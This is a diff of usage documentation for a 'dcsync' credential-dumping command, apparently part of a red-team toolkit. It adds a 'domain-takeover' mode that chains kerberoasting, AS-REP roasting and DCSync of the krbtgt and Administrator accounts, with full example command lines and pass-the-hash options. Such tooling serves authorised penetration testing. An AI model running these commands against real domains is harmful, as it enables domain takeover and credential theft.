@@ -15,15 +15,16 @@ Supports pass-the-hash authentication. Cross-platform — works from Windows, Li
 
 ## Arguments
 
-| Argument | Required | Description |
-|----------|----------|-------------|
-| server | Yes | Domain Controller IP or hostname |
-| username | Yes | Account with replication rights (`DOMAIN\user` or `user@domain`) |
-| password | No* | Password (*required unless hash is provided) |
-| hash | No* | NT hash for pass-the-hash (hex, e.g., `aad3b435...:8846f7ea...` or just NT hash) |
-| domain | No | Domain name (auto-detected from username if `DOMAIN\user` or `user@domain` format) |
-| target | Yes | Target account(s) to dump, comma-separated (e.g., `Administrator,krbtgt`) |
-| timeout | No | Operation timeout in seconds (default: 120) |
+| Argument | Required | Default | Description |
+|----------|----------|---------|-------------|
+| action | No | sync | `sync`: extract specific account hashes. `domain-takeover`: automated parallel chain. |
+| server | Yes | - | Domain Controller IP or hostname |
+| username | Yes | - | Account with replication rights (`DOMAIN\user` or `user@domain`) |
+| password | No* | - | Password (*required unless hash is provided) |
+| hash | No* | - | NT hash for pass-the-hash (hex, e.g., `aad3b435...:8846f7ea...` or just NT hash) |
+| domain | No | - | Domain name (auto-detected from username if `DOMAIN\user` or `user@domain` format) |
+| target | No* | - | Target account(s), comma-separated (*required for sync, auto-set for domain-takeover) |
+| timeout | No | 120 | Operation timeout in seconds |
 
 ## Usage
 
@@ -36,6 +37,12 @@ dcsync -server 192.168.1.1 -username admin@corp.local -password P@ssw0rd -target
 ```
 dcsync -server dc01 -username CORP\admin -password P@ssw0rd -target "Administrator,krbtgt,svc_backup"
 ```
+
+### Domain Takeover (subtask chain)
+```
+dcsync -action domain-takeover -server dc01 -username admin@corp.local -password P@ssw0rd
+```
+Runs kerberoast + asrep-roast + dcsync (krbtgt, Administrator) in parallel. Aggregates total hash count across all three attack vectors.
 
 ### Pass-the-hash
 ```
